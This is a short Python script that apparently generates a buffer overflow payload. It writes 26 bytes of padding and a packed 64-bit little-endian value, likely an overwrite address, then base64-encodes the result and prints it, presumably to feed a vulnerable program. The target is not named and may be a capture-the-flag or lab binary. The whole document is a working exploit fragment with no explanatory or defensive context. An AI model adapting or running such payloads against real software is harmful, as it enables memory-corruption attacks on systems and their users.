
import sys
import struct
import base64

buf = b'IIIIIIIIIIIIIIIIIIIIIIIIII'
buf += struct.pack('<Q', 6005921247100300474)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
